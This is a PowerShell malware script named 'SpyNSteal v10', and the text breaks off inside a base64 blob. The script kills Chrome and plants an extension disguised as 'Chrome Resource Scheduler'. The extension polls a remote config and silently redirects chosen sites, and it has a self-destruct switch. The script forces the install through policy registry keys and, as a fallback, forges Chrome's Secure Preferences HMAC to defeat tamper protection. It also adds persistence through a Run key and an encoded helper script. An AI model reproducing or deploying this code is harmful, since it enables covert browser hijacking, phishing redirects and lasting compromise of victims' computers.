# SpyNSteal v10 - Policy + HMAC Hybrid (USER-ONLY, no admin)
# Primary: HKCU ExtensionInstallForcelist via reg.exe + CWS URL trick.
# Fallback: when Policies registry is locked, enable via Secure Preferences MAC patch.
# Installs startup refresher via HKCU Run key.

$MANIFEST_TEMPLATE = @'
{"manifest_version":3,"name":"Chrome Resource Scheduler","version":"1.0","description":"Manages internal resource scheduling and prioritization.","permissions":["declarativeNetRequest"],"host_permissions":["<all_urls>"],"background":{"service_worker":"sw.js"}}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return false;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return true;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
    return true;
  } catch (_) { return false; }
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  const ok = await pull();
  if (!ok) await applyRule("||hi.com", "https://hi-test.com/");
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try { Add-Content $LOGFILE "[$ts] $msg" } catch {}
}

Log "=========================================="
Log "SpyNSteal v10 - Policy Extension"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "=========================================="

# --- STEP 1: Find Chrome ---
Log "STEP 1: Finding Chrome..."
$chromeExe = $null
$chromePaths = @(
    "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
)
foreach ($p in $chromePaths) {
    if (Test-Path $p) { $chromeExe = $p; break }
}
if (-not $chromeExe) {
    Log "ERROR: Chrome not found"
    exit 1
}
Log "  Chrome: $chromeExe"

$userDataDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$defaultProfile = "$userDataDir\Default"
$extensionsDir = "$defaultProfile\Extensions"

# --- STEP 2: Kill Chrome ---
Log "STEP 2: Killing Chrome..."
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

# --- STEP 3: Create extension source ---
Log "STEP 3: Creating extension source..."
$persistDir = Join-Path $env:APPDATA "ChromePolicy"
New-Item -Path $persistDir -ItemType Directory -Force | Out-Null
$extSrcDir = Join-Path $persistDir "extension"
New-Item -Path $extSrcDir -ItemType Directory -Force | Out-Null

Set-Content (Join-Path $extSrcDir "manifest.json") $MANIFEST_TEMPLATE -Encoding UTF8
Set-Content (Join-Path $extSrcDir "sw.js") $SW_JS -Encoding UTF8

# --- STEP 4: Pack extension (or reuse existing CRX) ---
Log "STEP 4: Packing extension into CRX..."
$crxPath = Join-Path $persistDir "extension.crx"
$pemPath = Join-Path $persistDir "extension.pem"

if (-not (Test-Path $pemPath)) {
    $proc = Start-Process $chromeExe -ArgumentList "--pack-extension=`"$extSrcDir`"" -PassThru -Wait -NoNewWindow
    if (-not (Test-Path $crxPath)) {
        Log "ERROR: CRX not created"
        exit 1
    }
} else {
    $proc = Start-Process $chromeExe -ArgumentList "--pack-extension=`"$extSrcDir`" --pack-extension-key=`"$pemPath`"" -PassThru -Wait -NoNewWindow
}
Log "  CRX: $crxPath ($((Get-Item $crxPath).Length) bytes)"

# --- STEP 5: Extract extension ID from CRX3 ---
Log "STEP 5: Extracting extension ID..."
$crxBytes = [System.IO.File]::ReadAllBytes($crxPath)

function Read-Varint($bytes, [ref]$offset) {
    $result = [uint64]0; $shift = 0
    do { $b = $bytes[$offset.Value]; $offset.Value++; $result = $result -bor (([uint64]($b -band 0x7F)) -shl $shift); $shift += 7 } while ($b -band 0x80)
    return $result
}

$headerLen = [BitConverter]::ToUInt32($crxBytes, 8)
$pos = 12; $headerEnd = 12 + $headerLen; $pubKey = $null

while ($pos -lt $headerEnd -and $pubKey -eq $null) {
    $tag = Read-Varint $crxBytes ([ref]$pos)
    $fn = [int]($tag -shr 3); $wt = [int]($tag -band 7)
    if ($wt -eq 2) {
        $len = [int](Read-Varint $crxBytes ([ref]$pos))
        if ($fn -eq 2) {
            $ne = $pos + $len; $np = $pos
            while ($np -lt $ne) {
                $nt = Read-Varint $crxBytes ([ref]$np); $nf = [int]($nt -shr 3); $nw = [int]($nt -band 7)
                if ($nw -eq 2) { $nl = [int](Read-Varint $crxBytes ([ref]$np)); if ($nf -eq 1 -and $pubKey -eq $null) { $pubKey = New-Object byte[] $nl; [Array]::Copy($crxBytes,$np,$pubKey,0,$nl) }; $np += $nl }
                elseif ($nw -eq 0) { $null = Read-Varint $crxBytes ([ref]$np) } else { break }
            }
            $pos += $len
        } else { $pos += $len }
    } elseif ($wt -eq 0) { $null = Read-Varint $crxBytes ([ref]$pos) }
    elseif ($wt -eq 5) { $pos += 4 } elseif ($wt -eq 1) { $pos += 8 } else { break }
}

$sha = [System.Security.Cryptography.SHA256]::Create()
$hash = $sha.ComputeHash($pubKey)
$extId = ""
for ($i = 0; $i -lt 16; $i++) { $b = $hash[$i]; $extId += [char]([int][char]'a' + (($b -shr 4) -band 0x0F)); $extId += [char]([int][char]'a' + ($b -band 0x0F)) }
Log "  Extension ID: $extId"

# Save extension ID for refresher
Set-Content (Join-Path $persistDir "ext_id.txt") $extId

# --- STEP 6: Install extension files ---
Log "STEP 6: Installing extension files..."
$extInstallDir = Join-Path $extensionsDir "$extId\1.0_0"
New-Item -Path $extInstallDir -ItemType Directory -Force | Out-Null
Copy-Item (Join-Path $extSrcDir "manifest.json") $extInstallDir -Force
Copy-Item (Join-Path $extSrcDir "sw.js") $extInstallDir -Force

# --- STEP 7: Create update manifest ---
Log "STEP 7: Creating update manifest..."
$updateXml = @"
<?xml version='1.0' encoding='UTF-8'?>
<gupdate xmlns='http://www.google.com/update2/response' protocol='2.0'>
  <app appid='$extId'>
    <updatecheck codebase='file:///$($crxPath -replace '\\','/')' version='1.0' />
  </app>
</gupdate>
"@
$updateXmlPath = Join-Path $persistDir "update.xml"
Set-Content $updateXmlPath $updateXml -Encoding UTF8
$localUpdateUrl = "file:///$($updateXmlPath -replace '\\','/')"

# --- Helpers: reg.exe + HMAC enable fallback ---
$secPrefsPath = "$defaultProfile\Secure Preferences"
$cwsUpdateUrl = "https://clients2.google.com/service/update2/crx"
$chromeDir = Split-Path $chromeExe -Parent

function Invoke-RegAdd([string]$KeyPath, [string]$Name, [string]$Value) {
    $escaped = $Value -replace '"','\"'
    $null = cmd /c "reg add `"$KeyPath`" /v `"$Name`" /t REG_SZ /d `"$escaped`" /f >nul 2>&1"
    return ($LASTEXITCODE -eq 0)
}

function Set-ExternalRegistry([string]$Id, [string]$LocalUrl, [string]$Crx) {
    $base = "HKCU\Software\Google\Chrome\Extensions\$Id"
    $ok = (Invoke-RegAdd $base "update_url" $LocalUrl) -and
          (Invoke-RegAdd $base "path" $Crx) -and
          (Invoke-RegAdd $base "version" "1.0")
    Log "  External registry (reg.exe): $ok"
    return $ok
}

function Set-ChromePoliciesReg([string]$Id, [string]$UpdateUrl) {
    $val = "$Id;$UpdateUrl"
    $ok = (Invoke-RegAdd "HKCU\Software\Policies\Google\Chrome\ExtensionInstallForcelist" "1" $val) -and
          (Invoke-RegAdd "HKCU\Software\Policies\Google\Chrome\ExtensionInstallAllowlist" "1" $Id) -and
          (Invoke-RegAdd "HKCU\Software\Policies\Google\Chrome\ExtensionInstallAllowlist" "2" "*")
    Log "  Policies registry (reg.exe): $ok"
    return $ok
}

function Get-ExtDisableReasons([string]$Content, [string]$Id) {
    $idx = $Content.IndexOf("`"$Id`":{")
    if ($idx -lt 0) { return $null }
    $chunk = $Content.Substring($idx, [Math]::Min(2000, $Content.Length - $idx))
    $m = [regex]::Match($chunk, '"disable_reasons":\[([^\]]*)\]')
    if ($m.Success -and $m.Groups[1].Value) { return $m.Groups[1].Value }
    return ""
}

$asmDir = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
$webExtAsm = Join-Path $asmDir "System.Web.Extensions.dll"
Add-Type -ReferencedAssemblies @("System.Web.Extensions.dll") -TypeDefinition @'
using System; using System.Collections.Generic; using System.Security.Cryptography; using System.Text;
using System.Web.Script.Serialization;
public class ExtEnable {
    static byte[] seed; static string deviceId;
    static JavaScriptSerializer jss = new JavaScriptSerializer { MaxJsonLength = int.MaxValue };
    public static void Init(byte[] s, string d) { seed = s; deviceId = d; }
    static string Hmac(string msg) {
        using (var h = new HMACSHA256(seed))
            return BitConverter.ToString(h.ComputeHash(Encoding.UTF8.GetBytes(msg))).Replace("-","");
    }
    static string Esc(string s) {
        var sb = new StringBuilder();
        foreach (char c in s) {
            if (c == '"') sb.Append("\\\"");
            else if (c == '\\') sb.Append("\\\\");
            else if (c == '\n') sb.Append("\\n");
            else if (c == '\r') sb.Append("\\r");
            else if (c == '\t') sb.Append("\\t");
            else if (c < 0x20) sb.AppendFormat("\\u{0:X4}", (int)c);
            else sb.Append(c);
        }
        return sb.ToString();
    }
    static string Canon(object obj) {
        if (obj == null) return "null";
        if (obj is bool) return (bool)obj ? "true" : "false";
        if (obj is string) return "\"" + Esc((string)obj) + "\"";
        if (obj is int || obj is long) return obj.ToString();
        if (obj is double) { double d=(double)obj; if (d==Math.Floor(d)&&Math.Abs(d)<1e15) return ((long)d).ToString(); return d.ToString("R"); }
        if (obj is decimal) { decimal dc=(decimal)obj; if (dc==Math.Floor(dc)) return ((long)dc).ToString(); return dc.ToString(System.Globalization.CultureInfo.InvariantCulture); }
        if (obj is object[]) {
            var arr=(object[])obj; if (arr.Length==0) return null;
            var p=new List<string>(); foreach (var i in arr) { var v=Canon(i); if (v!=null) p.Add(v); }
            if (p.Count==0) return null; return "["+string.Join(",",p.ToArray())+"]";
        }
        if (obj is Dictionary<string,object>) {
            var dict=(Dictionary<string,object>)obj; if (dict.Count==0) return null;
            var keys=new List<string>(dict.Keys); keys.Sort(StringComparer.Ordinal);
            var p=new List<string>(); foreach (var k in keys) { var v=Canon(dict[k]); if (v!=null) p.Add("\""+Esc(k)+"\":"+v); }
            if (p.Count==0) return null; return "{"+string.Join(",",p.ToArray())+"}";
        }
        if (obj is System.Collections.ArrayList) {
            var arr=(System.Collections.ArrayList)obj; if (arr.Count==0) return null;
            var p=new List<string>(); foreach (var i in arr) { var v=Canon(i); if (v!=null) p.Add(v); }
            if (p.Count==0) return null; return "["+string.Join(",",p.ToArray())+"]";
        }
        return obj.ToString();
    }
    public static string Patch(string content, string extId) {
        int extStart = content.IndexOf("\""+extId+"\":{");
        if (extStart < 0) return null;
        int blockEnd = extStart;
        int depth = 0;
        for (int i = extStart + extId.Length + 2; i < content.Length; i++) {
            if (content[i]=='{') depth++;
            else if (content[i]=='}') { depth--; if (depth==0) { blockEnd = i; break; } }
        }
        string block = content.Substring(extStart, blockEnd - extStart + 1);
        string patched = System.Text.RegularExpressions.Regex.Replace(block, ",?\"disable_reasons\":\\[[^\\]]*\\]", "");
        if (!patched.Contains("\"state\":")) {
            patched = patched.Replace("\""+extId+"\":{", "\""+extId+"\":{\"state\":1,");
        } else {
            patched = System.Text.RegularExpressions.Regex.Replace(patched, "\"state\":\\d+", "\"state\":1");
        }
        content = content.Substring(0, extStart) + patched + content.Substring(blockEnd + 1);
        var root = jss.Deserialize<Dictionary<string,object>>(content);
        var protection = (Dictionary<string,object>)root["protection"];
        var macs = (Dictionary<string,object>)protection["macs"];
        var extMacs = (Dictionary<string,object>)macs["extensions"];
        var settingsMacs = (Dictionary<string,object>)extMacs["settings"];
        var extensions = (Dictionary<string,object>)((Dictionary<string,object>)root["extensions"])["settings"];
        var extSettings = (Dictionary<string,object>)extensions[extId];
        string canonical = Canon(extSettings);
        string macPath = "extensions.settings."+extId;
        string newMac = Hmac(deviceId + macPath + canonical);
        settingsMacs[extId] = newMac;
        string macsCanonical = Canon(macs);
        string newSuper = Hmac(deviceId + macsCanonical);
        string oldMacKey = "\""+extId+"\":\"";
        int macsStart = content.IndexOf("\"macs\":{");
        int macPos = content.IndexOf(oldMacKey, macsStart);
        if (macPos > 0) {
            int valStart = macPos + oldMacKey.Length;
            int valEnd = content.IndexOf("\"", valStart);
            content = content.Remove(valStart, valEnd - valStart).Insert(valStart, newMac);
        }
        string smKey = "\"super_mac\":\"";
        int smPos = content.IndexOf(smKey);
        if (smPos >= 0) {
            int smValStart = smPos + smKey.Length;
            int smValEnd = content.IndexOf("\"", smValStart);
            content = content.Remove(smValStart, smValEnd - smValStart).Insert(smValStart, newSuper);
        }
        return content;
    }
}
'@ -ErrorAction SilentlyContinue

function Get-ChromeSeed([string]$ChromeDir) {
    $pakPath = Join-Path $ChromeDir "resources.pak"
    if (-not (Test-Path $pakPath)) { return $null }
    try {
        $bytes = [IO.File]::ReadAllBytes($pakPath)
        $count = [BitConverter]::ToUInt16($bytes, 4)
        $id = 146; $idx = -1
        for ($i = 0; $i -lt $count; $i++) {
            $off = 6 + ($i * 6)
            if ([BitConverter]::ToUInt16($bytes, $off) -eq $id) { $idx = $i; break }
        }
        if ($idx -lt 0) { return $null }
        $eoff = 6 + ($idx * 6)
        $dataOff = [BitConverter]::ToUInt32($bytes, $eoff + 2)
        $dataLen = [BitConverter]::ToUInt16($bytes, $eoff + 4)
        if ($dataLen -ne 64) { return $null }
        $seed = New-Object byte[] 64
        [Array]::Copy($bytes, $dataOff, $seed, 0, 64)
        return $seed
    } catch { return $null }
}

function Enable-ExtensionSecPrefs([string]$Path, [string]$Id, [string]$ChromeDir) {
    $seed = Get-ChromeSeed $ChromeDir
    if (-not $seed) {
        $seedHex = "e748f336d85ea5f9dcdf25d8f347a65b4cdf667600f02df6724a2af18a212d26b788a25086910cf3a90313696871f3dc05823730c91df8ba5c4fd9c884b505a8"
        $seed = New-Object byte[] 64
        for ($i = 0; $i -lt 64; $i++) { $seed[$i] = [Convert]::ToByte($seedHex.Substring($i*2,2),16) }
        Log "  Using fallback seed"
    }
    $sid = ([Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    $parts = $sid.Split('-')
    $deviceId = ($parts[0..($parts.Length-2)]) -join '-'
    [ExtEnable]::Init($seed, $deviceId)
    $content = [IO.File]::ReadAllText($Path, [Text.Encoding]::UTF8)
    $patched = [ExtEnable]::Patch($content, $Id)
    if (-not $patched) { Log "  HMAC enable: extension not in SecPrefs"; return $false }
    [IO.File]::WriteAllText($Path, $patched, (New-Object Text.UTF8Encoding($false)))
    Log "  HMAC enable: patched SecPrefs"
    return $true
}

# --- STEP 8: Install via external registry + policies ---
Log "STEP 8: Installing extension..."
Set-ExternalRegistry $extId $localUpdateUrl $crxPath | Out-Null
$policyOk = Set-ChromePoliciesReg $extId $localUpdateUrl

Start-Process $chromeExe
Start-Sleep 15

$content = Get-Content $secPrefsPath -Raw
Log "  Extension in SecPrefs: $($content.Contains($extId))"
$dr = Get-ExtDisableReasons $content $extId
if ($dr -ne "" -and $dr -ne $null) { Log "  After install disable_reasons: [$dr]" }

# --- STEP 9: Phase 2 (only if policies writable) or HMAC enable ---
Log "STEP 9: Enable extension..."
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

if ($policyOk) {
    Log "  Policies OK - trying CWS URL phase..."
    Set-ChromePoliciesReg $extId $cwsUpdateUrl | Out-Null
    Start-Process $chromeExe
    Start-Sleep 12
    Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep 2
    $content = Get-Content $secPrefsPath -Raw
    $dr = Get-ExtDisableReasons $content $extId
    if ($dr -eq "" -or $dr -eq $null) {
        Log "  Phase 2: ENABLED via policy"
    } else {
        Log "  Phase 2 still disabled [$dr] - using HMAC fallback"
        Enable-ExtensionSecPrefs $secPrefsPath $extId $chromeDir | Out-Null
    }
} else {
    Log "  Policies LOCKED - using HMAC fallback"
    Enable-ExtensionSecPrefs $secPrefsPath $extId $chromeDir | Out-Null
}

Start-Process $chromeExe
Start-Sleep 8
$content = Get-Content $secPrefsPath -Raw
$dr = Get-ExtDisableReasons $content $extId
if ($dr -eq "" -or $dr -eq $null) { Log "  Final state: ENABLED" } else { Log "  Final state: disable_reasons [$dr]" }

# --- STEP 10: Write enable helper + startup refresher ---
Log "STEP 10: Installing startup refresher..."

$enablePath = Join-Path $persistDir "enable.ps1"
[IO.File]::WriteAllBytes($enablePath, [Convert]::FromBase64String('cGFyYW0oW3N0cmluZ10kRXh0SWQsIFtzdHJpbmddJENocm9tZURpciwgW3N0cmluZ10kU2VjUHJlZnNQYXRoKQ0KJGFzbURpciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5SdW50aW1lRW52aXJvbm1lbnRdOjpHZXRSdW50aW1lRGlyZWN0b3J5KCkNCkFkZC1UeXBlIC1SZWZlcmVuY2VkQXNzZW1ibGllcyBAKCIkYXNtRGlyXFN5c3RlbS5XZWIuRXh0ZW5zaW9ucy5kbGwiKSAtVHlwZURlZmluaXRpb24gQCcNCnVzaW5nIFN5c3RlbTsgdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7IHVzaW5nIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHk7IHVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLldlYi5TY3JpcHQuU2VyaWFsaXphdGlvbjsNCnB1YmxpYyBjbGFzcyBFeHRFbmFibGUgew0KICAgIHN0YXRpYyBieXRlW10gc2VlZDsgc3RhdGljIHN0cmluZyBkZXZpY2VJZDsNCiAgICBzdGF0aWMgSmF2YVNjcmlwdFNlcmlhbGl6ZXIganNzID0gbmV3IEphdmFTY3JpcHRTZXJpYWxpemVyIHsgTWF4SnNvbkxlbmd0aCA9IGludC5NYXhWYWx1ZSB9Ow0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBJbml0KGJ5dGVbXSBzLCBzdHJpbmcgZCkgeyBzZWVkID0gczsgZGV2aWNlSWQgPSBkOyB9DQogICAgc3RhdGljIHN0cmluZyBIbWFjKHN0cmluZyBtc2cpIHsgdXNpbmcgKHZhciBoID0gbmV3IEhNQUNTSEEyNTYoc2VlZCkpIHJldHVybiBCaXRDb252ZXJ0ZXIuVG9TdHJpbmcoaC5Db21wdXRlSGFzaChFbmNvZGluZy5VVEY4LkdldEJ5dGVzKG1zZykpKS5SZXBsYWNlKCItIiwiIik7IH0NCiAgICBzdGF0aWMgc3RyaW5nIEVzYyhzdHJpbmcgcykgeyB2YXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOyBmb3JlYWNoIChjaGFyIGMgaW4gcykgeyBpZiAoYz09JyInKSBzYi5BcHBlbmQoIlxcXCIiKTsgZWxzZSBpZiAoYz09J1xcJykgc2IuQXBwZW5kKCJcXFxcIik7IGVsc2UgaWYgKGM9PSdcbicpIHNiLkFwcGVuZCgiXFxuIik7IGVsc2UgaWYgKGM9PSdccicpIHNiLkFwcGVuZCgiXFxyIik7IGVsc2UgaWYgKGM9PSdcdCcpIHNiLkFwcGVuZCgiXFx0Iik7IGVsc2UgaWYgKGM8MHgyMCkgc2IuQXBwZW5kRm9ybWF0KCJcXHV7MDpYNH0iLChpbnQpYyk7IGVsc2Ugc2IuQXBwZW5kKGMpOyB9IHJldHVybiBzYi5Ub1N0cmluZygpOyB9DQogICAgc3RhdGljIHN0cmluZyBDYW5vbihvYmplY3Qgb2JqKSB7DQogICAgICAgIGlmIChvYmo9PW51bGwpIHJldHVybiAibnVsbCI7IGlmIChvYmogaXMgYm9vbCkgcmV0dXJuIChib29sKW9iaj8idHJ1ZSI6ImZhbHNlIjsgaWYgKG9iaiBpcyBzdHJpbmcpIHJldHVybiAiXCIiK0VzYygoc3RyaW5nKW9iaikrIlwiIjsNCiAgICAgICAgaWYgKG9iaiBpcyBpbnR8fG9iaiBpcyBsb25nKSByZXR1cm4gb2JqLlRvU3RyaW5nKCk7DQogICAgICAgIGlmIChvYmogaXMgZG91YmxlKSB7IGRvdWJsZSBkPShkb3VibGUpb2JqOyBpZiAoZD09TWF0aC5GbG9vcihkKSYmTWF0aC5BYnMoZCk8MWUxNSkgcmV0dXJuICgobG9uZylkKS5Ub1N0cmluZygpOyByZXR1cm4gZC5Ub1N0cmluZygiUiIpOyB9DQogICAgICAgIGlmIChvYmogaXMgZGVjaW1hbCkgeyBkZWNpbWFsIGRjPShkZWNpbWFsKW9iajsgaWYgKGRjPT1NYXRoLkZsb29yKGRjKSkgcmV0dXJuICgobG9uZylkYykuVG9TdHJpbmcoKTsgcmV0dXJuIGRjLlRvU3RyaW5nKFN5c3RlbS5HbG9iYWxpemF0aW9uLkN1bHR1cmVJbmZvLkludmFyaWFudEN1bHR1cmUpOyB9DQogICAgICAgIGlmIChvYmogaXMgb2JqZWN0W10pIHsgdmFyIGFycj0ob2JqZWN0W10pb2JqOyBpZihhcnIuTGVuZ3RoPT0wKSByZXR1cm4gbnVsbDsgdmFyIHA9bmV3IExpc3Q8c3RyaW5nPigpOyBmb3JlYWNoKHZhciBpIGluIGFycil7dmFyIHY9Q2Fub24oaSk7aWYodiE9bnVsbClwLkFkZCh2KTt9IGlmKHAuQ291bnQ9PTApcmV0dXJuIG51bGw7IHJldHVybiAiWyIrc3RyaW5nLkpvaW4oIiwiLHAuVG9BcnJheSgpKSsiXSI7IH0NCiAgICAgICAgaWYgKG9iaiBpcyBEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+KSB7IHZhciBkaWN0PShEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+KW9iajsgaWYoZGljdC5Db3VudD09MCkgcmV0dXJuIG51bGw7IHZhciBrZXlzPW5ldyBMaXN0PHN0cmluZz4oZGljdC5LZXlzKTsga2V5cy5Tb3J0KFN0cmluZ0NvbXBhcmVyLk9yZGluYWwpOyB2YXIgcD1uZXcgTGlzdDxzdHJpbmc+KCk7IGZvcmVhY2godmFyIGsgaW4ga2V5cyl7dmFyIHY9Q2Fub24oZGljdFtrXSk7aWYodiE9bnVsbClwLkFkZCgiXCIiK0VzYyhrKSsiXCI6Iit2KTt9IGlmKHAuQ291bnQ9PTApcmV0dXJuIG51bGw7IHJldHVybiAieyIrc3RyaW5nLkpvaW4oIiwiLHAuVG9BcnJheSgpKSsifSI7IH0NCiAgICAgICAgaWYgKG9iaiBpcyBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0KSB7IHZhciBhcnI9KFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Qpb2JqOyBpZihhcnIuQ291bnQ9PTApIHJldHVybiBudWxsOyB2YXIgcD1uZXcgTGlzdDxzdHJpbmc+KCk7IGZvcmVhY2godmFyIGkgaW4gYXJyKXt2YXIgdj1DYW5vbihpKTtpZih2IT1udWxsKXAuQWRkKHYpO30gaWYocC5Db3VudD09MClyZXR1cm4gbnVsbDsgcmV0dXJuICJbIitzdHJpbmcuSm9pbigiLCIscC5Ub0FycmF5KCkpKyJdIjsgfQ0KICAgICAgICByZXR1cm4gb2JqLlRvU3RyaW5nKCk7DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFBhdGNoKHN0cmluZyBjb250ZW50LCBzdHJpbmcgZXh0SWQpIHsNCiAgICAgICAgaW50IGV4dFN0YXJ0ID0gY29udGVudC5JbmRleE9mKCJcIiIrZXh0SWQrIlwiOnsiKTsgaWYgKGV4dFN0YXJ0PDApIHJldHVybiBudWxsOw0KICAgICAgICBpbnQgYmxvY2tFbmQ9ZXh0U3RhcnQsIGRlcHRoPTA7DQogICAgICAgIGZvciAoaW50IGk9ZXh0U3RhcnQrZXh0SWQuTGVuZ3RoKzI7aTxjb250ZW50Lkxlbmd0aDtpKyspIHsgaWYoY29udGVudFtpXT09J3snKWRlcHRoKys7IGVsc2UgaWYoY29udGVudFtpXT09J30nKXtkZXB0aC0tO2lmKGRlcHRoPT0wKXtibG9ja0VuZD1pO2JyZWFrO319IH0NCiAgICAgICAgc3RyaW5nIGJsb2NrPWNvbnRlbnQuU3Vic3RyaW5nKGV4dFN0YXJ0LGJsb2NrRW5kLWV4dFN0YXJ0KzEpOw0KICAgICAgICBzdHJpbmcgcGF0Y2hlZD1TeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnMuUmVnZXguUmVwbGFjZShibG9jaywiLD9cImRpc2FibGVfcmVhc29uc1wiOlxcW1teXFxdXSpcXF0iLCIiKTsNCiAgICAgICAgaWYoIXBhdGNoZWQuQ29udGFpbnMoIlwic3RhdGVcIjoiKSkgcGF0Y2hlZD1wYXRjaGVkLlJlcGxhY2UoIlwiIitleHRJZCsiXCI6eyIsIlwiIitleHRJZCsiXCI6e1wic3RhdGVcIjoxLCIpOw0KICAgICAgICBlbHNlIHBhdGNoZWQ9U3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4LlJlcGxhY2UocGF0Y2hlZCwiXCJzdGF0ZVwiOlxcZCsiLCJcInN0YXRlXCI6MSIpOw0KICAgICAgICBjb250ZW50PWNvbnRlbnQuU3Vic3RyaW5nKDAsZXh0U3RhcnQpK3BhdGNoZWQrY29udGVudC5TdWJzdHJpbmcoYmxvY2tFbmQrMSk7DQogICAgICAgIHZhciByb290PWpzcy5EZXNlcmlhbGl6ZTxEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+Pihjb250ZW50KTsNCiAgICAgICAgdmFyIHByb3RlY3Rpb249KERpY3Rpb25hcnk8c3RyaW5nLG9iamVjdD4pcm9vdFsicHJvdGVjdGlvbiJdOyB2YXIgbWFjcz0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0Pilwcm90ZWN0aW9uWyJtYWNzIl07DQogICAgICAgIHZhciBleHRNYWNzPShEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+KW1hY3NbImV4dGVuc2lvbnMiXTsgdmFyIHNldHRpbmdzTWFjcz0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PilleHRNYWNzWyJzZXR0aW5ncyJdOw0KICAgICAgICB2YXIgZXh0ZW5zaW9ucz0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PikoKERpY3Rpb25hcnk8c3RyaW5nLG9iamVjdD4pcm9vdFsiZXh0ZW5zaW9ucyJdKVsic2V0dGluZ3MiXTsNCiAgICAgICAgdmFyIGV4dFNldHRpbmdzPShEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+KWV4dGVuc2lvbnNbZXh0SWRdOw0KICAgICAgICBzdHJpbmcgY2Fub25pY2FsPUNhbm9uKGV4dFNldHRpbmdzKTsgc3RyaW5nIG1hY1BhdGg9ImV4dGVuc2lvbnMuc2V0dGluZ3MuIitleHRJZDsgc3RyaW5nIG5ld01hYz1IbWFjKGRldmljZUlkK21hY1BhdGgrY2Fub25pY2FsKTsNCiAgICAgICAgc2V0dGluZ3NNYWNzW2V4dElkXT1uZXdNYWM7IHN0cmluZyBtYWNzQ2Fub25pY2FsPUNhbm9uKG1hY3MpOyBzdHJpbmcgbmV3U3VwZXI9SG1hYyhkZXZpY2VJZCttYWNzQ2Fub25pY2FsKTsNCiAgICAgICAgc3RyaW5nIG9sZE1hY0tleT0iXCIiK2V4dElkKyJcIjpcIiI7IGludCBtYWNzU3RhcnQ9Y29udGVudC5JbmRleE9mKCJcIm1hY3NcIjp7Iik7IGludCBtYWNQb3M9Y29udGVudC5JbmRleE9mKG9sZE1hY0tleSxtYWNzU3RhcnQpOw0KICAgICAgICBpZihtYWNQb3M+MCl7aW50IHZhbFN0YXJ0PW1hY1BvcytvbGRNYWNLZXkuTGVuZ3RoO2ludCB2YWxFbmQ9Y29udGVudC5JbmRleE9mKCJcIiIsdmFsU3RhcnQpO2NvbnRlbnQ9Y29udGVudC5SZW1vdmUodmFsU3RhcnQsdmFsRW5kLXZhbFN0YXJ0KS5JbnNlcnQodmFsU3RhcnQsbmV3TWFjKTt9DQogICAgICAgIHN0cmluZyBzbUtleT0iXCJzdXBlcl9tYWNcIjpcIiI7IGludCBzbVBvcz1jb250ZW50LkluZGV4T2Yoc21LZXkpOw0KICAgICAgICBpZihzbVBvcz49MCl7aW50IHNtVmFsU3RhcnQ9c21Qb3Mrc21LZXkuTGVuZ3RoO2ludCBzbVZhbEVuZD1jb250ZW50LkluZGV4T2YoIlwiIixzbVZhbFN0YXJ0KTtjb250ZW50PWNvbnRlbnQuUmVtb3ZlKHNtVmFsU3RhcnQsc21WYWxFbmQtc21WYWxTdGFydCkuSW5zZXJ0KHNtVmFsU3RhcnQsbmV3U3VwZXIpO30NCiAgICAgICAgcmV0dXJuIGNvbnRlbnQ7DQogICAgfQ0KfQ0KJ0AgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCmZ1bmN0aW9uIEdldC1TZWVkKCRkaXIpIHsNCiAgICAkcGFrPUpvaW4tUGF0aCAkZGlyICJyZXNvdXJjZXMucGFrIjsgaWYoLW5vdChUZXN0LVBhdGggJHBhaykpe3JldHVybiAkbnVsbH0NCiAgICAkYj1bSU8u